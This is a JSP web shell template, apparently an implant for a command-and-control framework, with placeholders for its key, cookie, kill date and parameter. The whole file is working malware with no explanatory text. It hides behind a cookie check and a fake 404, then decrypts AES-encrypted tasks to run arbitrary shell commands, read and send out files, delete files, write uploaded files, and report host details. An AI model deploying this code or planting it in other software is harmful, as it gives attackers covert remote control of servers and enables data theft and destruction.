<%@ page import="java.util.*,java.util.zip.*,java.io.*,java.security.*,java.text.*,java.nio.*,java.net.*,javax.crypto.*,javax.crypto.spec.*" %><%!

String encryption_key = "%AESPSK%";
String cookie_value = "%UUID%";
String cookie_name = "%COOKIE%";

public void abortCall(HttpServletResponse response) throws Exception {
  response.setStatus(404);
  throw new javax.servlet.jsp.SkipPageException();
}

String cipherSpec = "AES/CBC/PKCS5Padding";
String base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

public Boolean checkDate() throws Exception {
  long killtime = new SimpleDateFormat("yyyy-MM-DD").parse("%KILLDATE%").getTime();
  return killtime > System.currentTimeMillis();
}

public String base64Encode(byte[] data) {
  StringBuilder encoded = new StringBuilder();
  int padding = 0;

  for (int i = 0; i < data.length; i += 3) {
    int b1 = data[i] & 0xFF;
    int b2 = (i + 1 < data.length) ? data[i + 1] & 0xFF : 0;
    int b3 = (i + 2 < data.length) ? data[i + 2] & 0xFF : 0;

    int combined = (b1 << 16) | (b2 << 8) | b3;

    int c1 = (combined >> 18) & 0x3F;
    int c2 = (combined >> 12) & 0x3F;
    int c3 = (combined >> 6) & 0x3F;
    int c4 = combined & 0x3F;

    encoded.append(base64chars.charAt(c1));
    encoded.append(base64chars.charAt(c2));

    if (i + 1 < data.length) {
      encoded.append(base64chars.charAt(c3));
    } else {
      padding++;
    }

    if (i + 2 < data.length) {
      encoded.append(base64chars.charAt(c4));
    } else {
      padding++;
    }
  }
  for (int i = 0; i < padding; i++) {
    encoded.append('=');
  }
  return encoded.toString();
}

public byte[] base64Decode(String s) throws Exception {
  String p = (s.charAt(s.length() - 1) == '=' ? (s.charAt(s.length() - 2) == '=' ? "AA" : "A") : "");
  ByteArrayOutputStream r = new ByteArrayOutputStream(s.length() - p.length());
  s = s.substring(0, s.length() - p.length()) + p;

  for (int c = 0; c < s.length(); c += 4) {
    int n = (base64chars.indexOf(s.charAt(c)) << 18) + (base64chars.indexOf(s.charAt(c + 1)) << 12)
    + (base64chars.indexOf(s.charAt(c + 2)) << 6) + base64chars.indexOf(s.charAt(c + 3));
    r.write(new byte[] {
      (byte) ((n >>> 16) & 0xFF),
      (byte) ((n >>> 8) & 0xFF),
      (byte) (n & 0xFF),
    });
  }

  byte[] resp = new byte[r.size() - p.length()];
  System.arraycopy(r.toByteArray(), 0, resp, 0, r.size() - p.length());
  return resp;
}

public byte[] base64UrlDecode(String data) throws Exception {
  return base64Decode(data.replace("-", "+").replace("_", "/"));
}

public String decrypt(byte[] ivHashCiphertext, String password) throws Exception {
    if(password == "")
      return new String(ivHashCiphertext);

    byte[] key = base64Decode(password);
    SecretKey secretKey = new SecretKeySpec(key, "AES");
    Cipher aesCipher = Cipher.getInstance(cipherSpec);


    byte[] iv = new byte[16];
    System.arraycopy(ivHashCiphertext, 0, iv, 0, 16);
    byte[] hash = new byte[32];
    System.arraycopy(ivHashCiphertext, ivHashCiphertext.length - 32, hash, 0, 32);
    byte[] ct = new byte[ivHashCiphertext.length - 32 - 16];
    System.arraycopy(ivHashCiphertext, 16, ct, 0, ivHashCiphertext.length - 32 - 16);

    aesCipher.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(iv));
    byte[] pt = aesCipher.doFinal(ct);


    byte[] ivct = new byte[16 + ct.length];
    System.arraycopy(ivHashCiphertext, 0, ivct, 0, ivct.length);

    Mac hmac = Mac.getInstance("HmacSHA256");
    SecretKeySpec hmacSecret = new SecretKeySpec(key, "HmacSHA256");
    hmac.init(hmacSecret);
    byte[] calcHash = hmac.doFinal(ivct);

    if (!Arrays.equals(hash, calcHash))
     return "error";
    return new String(pt);
}

public byte[] encrypt(String plaintext, String password) throws Exception {
    if (password == "")
      return plaintext.getBytes();

    ByteArrayOutputStream res = new ByteArrayOutputStream();

    byte[] key = base64Decode(password);
    SecretKey secretKey = new SecretKeySpec(key, "AES");
    Cipher aesCipher = Cipher.getInstance(cipherSpec);


    byte[] iv = new byte[16];
    new SecureRandom().nextBytes(iv);
    res.write(iv);

    aesCipher.init(Cipher.ENCRYPT_MODE, secretKey, new IvParameterSpec(iv));
    res.write(aesCipher.doFinal(plaintext.getBytes("UTF-8")));

    Mac hmac = Mac.getInstance("HmacSHA256");
    SecretKeySpec hmacSecret = new SecretKeySpec(key, "HmacSHA256");
    hmac.init(hmacSecret);
    byte[] hash = hmac.doFinal(res.toByteArray());
    res.write(hash);
    return res.toByteArray();
}

public String return_message(String message) throws Exception {
    return base64Encode(encrypt(message, encryption_key));
}


public String checkin() throws Exception {
  String ip = InetAddress.getLocalHost().getHostAddress();
  String os = System.getProperty("os.name");
  String user = System.getProperty("user.name");
  String host = InetAddress.getLocalHost().getHostName();
  String pid = java.lang.management.ManagementFactory.getRuntimeMXBean().getName().split("@")[0];
  String arch = System.getProperty("os.arch");
  String domain = "";

	return ip + "|" + os + "|" + user + "|" + host + "|" + domain + "|" + pid + "|" + arch + "|";
}

public Boolean isWindows() {
  return System.getProperty("os.name").toLowerCase().contains("win");

}

public String process_message(HttpServletResponse response, byte[] full_message) throws Exception {
  if( !checkDate() ){
    abortCall(response);
  }
  String msg = decrypt(full_message, encryption_key);

  String[] pieces = msg.split("\\|");
  if (pieces.length < 2 ) {
    return "error";
  }
  String task_id = pieces[0];

  String command = new String(base64Decode(pieces[1]));

  response.setStatus(200);

  if (command.equals("shell")) {
      String output = "";
      String[] cmd = new String[] {
        "/bin/sh",
        "-c",
        new String(base64Decode(pieces[2]))
      };
      if (isWindows()) {
        cmd = new String[] {
          "cmd.exe",
          "/c",
          new String(base64Decode(pieces[2]))
        };
      }
      Process p = java.lang.Runtime.getRuntime().exec(cmd);
      BufferedReader out = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line = out.readLine();
      while (line != null) {
         output += line+"\n";
         line = out.readLine();
      }
      out = new BufferedReader(new InputStreamReader(p.getErrorStream()));
      line = out.readLine();
      while (line != null) {
         output += line+"\n";
         line = out.readLine();
      }
      return task_id + "|" + output;
  }

  if (command.equals("pwd")) {
      return task_id + "|" + System.getProperty("user.dir");
  }

  if (command.equals("checkin")) {
    return task_id + "|" + checkin();
  }

  if (command.equals("download")) {
    String fname = new String(base64Decode(pieces[2]));
    File f = new File(fname);
    byte[] content = new byte[(int) f.length()];
    FileInputStream fis = new FileInputStream(f);
    fis.read(content);
    fis.close(); 
    return task_id + "|" + base64Encode(content);
  }

  if (command.equals("ls")) {
    String path = new String(base64Decode(pieces[2]));
    File folder = new File(path);
    String output = "Listing contents of: " + path + "\n\n";

    if (folder.isDirectory()) {
      File[] children = folder.listFiles();
      if (children == null)
        return task_id + "|" + "Failed to ls";

      output += "Size\tMTime\tName\n";
      for (int i = 0; i < children.length; i++) {
        output += String.valueOf(children[i].length()) + "\t" + String.valueOf(children[i].lastModified()) + "\t" + children[i].getName() + "\n";
      }
    } else if (folder.isFile()) {
        output += String.valueOf(folder.length()) + "\t" + String.valueOf(folder.lastModified()) + "\t" + folder.getName() + "\n";
    }
    return task_id + "|" + output;
  }

  if (command.equals("rm")) {
    String fname = new String(base64Decode(pieces[2]));
    if (new File(fname).delete())
      return task_id + "|" + "Removed file";
    return task_id + "|" + "Failed to remove file";
  }

  if (command.equals("upload")) {
    String fname = new String(base64Decode(pieces[2]));
    byte[] data = base64Decode(pieces[3]);
    try {
      FileOutputStream fos = new FileOutputStream(fname);
      fos.write(data);
      fos.close();
      return task_id + "|" + "Successfully wrote file";
    } catch (FileNotFoundException e) {
      return task_id + "|" + "Failed to write file";
    }
  }

  return task_id+ "|error";
}

public void checkCookie(Cookie[] cookies, HttpServletResponse response) throws Exception {
  for (int i = 0; i < cookies.length; i++) {
    if (cookies[i].getName().equals(cookie_name)) {
      if (cookies[i].getValue().equals(base64Encode(cookie_value.getBytes()))) {
        return;
      }
    }
  }
  abortCall(response);
}
%><%

checkCookie(request.getCookies(), response);

%><span id="task_response"><%

if (request.getMethod() == "POST") {
  BufferedReader reader = request.getReader();
  String raw_body = "";
  String line = reader.readLine();
  while (line != null) {
    raw_body += line;
    line = reader.readLine();
  }
  byte[] raw_message = base64Decode(raw_body);
  byte[] full_message = new byte[raw_message.length - 36];
  System.arraycopy(raw_message, 36, full_message, 0, full_message.length);
  String resp = process_message(response, full_message);
  out.print(return_message(resp));
} else if(request.getParameter("%PARAM%") != null){

  byte[] raw_message = base64UrlDecode(request.getParameter("%PARAM%"));
  byte[] full_message = new byte[raw_message.length - 36];
  System.arraycopy(raw_message, 36, full_message, 0, full_message.length);

  String resp = process_message(response, full_message);
  out.print(return_message(resp));
}else{
  abortCall(response);
}

%>
</span>
